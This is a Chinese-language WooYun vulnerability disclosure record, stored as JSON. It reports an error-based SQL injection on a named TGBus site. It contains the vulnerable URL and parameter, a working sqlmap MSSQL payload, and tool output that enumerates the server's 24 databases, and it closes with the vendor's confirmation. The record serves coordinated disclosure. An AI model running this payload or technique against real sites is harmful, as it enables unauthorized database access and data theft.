{"id": 72861, "wybug_id": "wooyun-2015-0159145", "wybug_title": "电玩巴士某站报错SQL注入（涉及主站所有数据库）", "wybug_corp": "电玩巴士", "wybug_author": "路人甲", "wybug_date": "2015-12-08 08:57", "wybug_open_date": "2016-01-21 18:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向公众公开  简要描述： 电玩巴士某站报错注入（涉及主站所有数据库） 详细说明：  URL：http://sns.tgbus.com/pspdatareader/down.aspx?gid=c02bc722-74d7-4f7c-82eb-6684af7bdefb注入点 gid   漏洞证明：  \nParameter: gid (GET)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: gid=c02bc722-74d7-4f7c-82eb-6684af7bdefb%df' AND 5704=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(120)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5704=5704) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(98)+CHAR(113)))and '='='=---[21:43:36] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[21:43:36] [INFO] fetching database names[21:43:36] [INFO] the SQL query used returns 24 entries[21:43:36] [INFO] retrieved: GBGBA_PE[21:43:36] [INFO] retrieved: Hero_CollectPush[21:43:36] [INFO] retrieved: master[21:43:39] [INFO] retrieved: model[21:43:40] [INFO] retrieved: msdb[21:43:47] [INFO] retrieved: MVPark_ZC_AD_ZhuCe_V2[21:43:47] [INFO] retrieved: Profiler_log[21:43:48] [INFO] retrieved: tempdb[21:43:48] [INFO] retrieved: TGBus_API_Score[21:43:48] [INFO] retrieved: TGBus_BlackMatket[21:43:49] [INFO] retrieved: TGBus_Client[21:43:49] [INFO] retrieved: TGBus_Comment[21:43:55] [INFO] retrieved: TGBus_DB[21:44:03] [INFO] retrieved: TGBus_DB_Dota2[21:44:10] [INFO] retrieved: TGBus_Down[21:44:10] [INFO] retrieved: TGBus_Games_New[21:44:11] [INFO] retrieved: TGBus_Idea[21:44:26] [INFO] retrieved: TGBus_iPhoneAPI[21:44:26] [INFO] retrieved: TGBus_mh4[21:44:27] [INFO] retrieved: TGBus_Product[21:44:27] [INFO] retrieved: TGBus_Sns_CheatCode[21:44:27] [INFO] retrieved: TGBus_sns_livecard[21:44:27] [INFO] retrieved: TGBus_sns_pspdatareader[21:44:57] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request[21:44:59] [INFO] retrieved: TGBus_Sns_Themeavailable databases [24]:[*] GBGBA_PE[*] Hero_CollectPush[*] master[*] model[*] msdb[*] MVPark_ZC_AD_ZhuCe_V2[*] Profiler_log[*] tempdb[*] TGBus_API_Score[*] TGBus_BlackMatket[*] TGBus_Client[*] TGBus_Comment[*] TGBus_DB[*] TGBus_DB_Dota2[*] TGBus_Down[*] TGBus_Games_New[*] TGBus_Idea[*] TGBus_iPhoneAPI[*] TGBus_mh4[*] TGBus_Product[*] TGBus_Sns_CheatCode[*] TGBus_sns_livecard[*] TGBus_sns_pspdatareader[*] TGBus_Sns_Theme\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-08 09:09 厂商回复： 感谢洞主对完美世界的关注，我们将尽快修补。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}